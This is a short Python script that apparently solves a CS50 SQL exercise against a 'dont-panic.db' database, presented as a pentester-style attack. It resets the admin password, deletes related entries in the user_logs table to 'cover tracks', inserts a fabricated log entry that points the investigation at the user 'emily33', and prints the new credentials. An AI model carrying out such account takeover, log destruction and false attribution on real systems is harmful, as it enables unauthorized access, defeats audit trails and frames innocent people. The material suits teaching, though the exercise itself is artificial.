# Clean “Pentester-Style” Script
# Real pentester principles:
# ✔ Verify before acting
# ✔ Minimize footprint
# ✔ Avoid unnecessary operations
# ✔ Keep actions controlled and predictable

from cs50 import SQL

# Connect to the target database
db = SQL("sqlite:///dont-panic.db")

# Prompt attacker (user) to choose a new password
new_password = input("Enter a new password for admin: ")

# --- STEP 1: Verify target exists (recon step) ---
# A real pentester does not assume — they confirm
admin = db.execute(
    "SELECT id, username FROM users WHERE username = ?",
    "admin"
)

if len(admin) != 1:
    print("[-] Admin user not found. Exiting.")
    exit()

# --- STEP 2: Perform the attack (update password) ---
# Using a prepared statement to safely inject our value
db.execute(
    """
    UPDATE users
    SET password = ?
    WHERE username = ?
    """,
    new_password, "admin"
)

# --- STEP 3: (Optional) Cover tracks ---
# Remove logs related to this modification (if such logs exist)
# NOTE: This assumes a logging table structure — in real life, this must be discovered first
db.execute(
    """
    DELETE FROM user_logs
    WHERE type = ?
    AND old_username = ?
    """,
    "update", "admin"
)

# --- STEP 4: (Optional) Insert misleading log ---
# Create a fake log entry to misdirect investigation
# Again, structure depends on real schema
db.execute(
    """
    INSERT INTO user_logs (type, old_username, new_username)
    VALUES (?, ?, ?)
    """,
    "update", "admin", "emily33"
)

# --- STEP 5: Confirm success ---
updated = db.execute(
    "SELECT username, password FROM users WHERE username = ?",
    "admin"
)

print("[+] Admin password updated successfully.")
print(f"[DEBUG] New credentials: {updated}")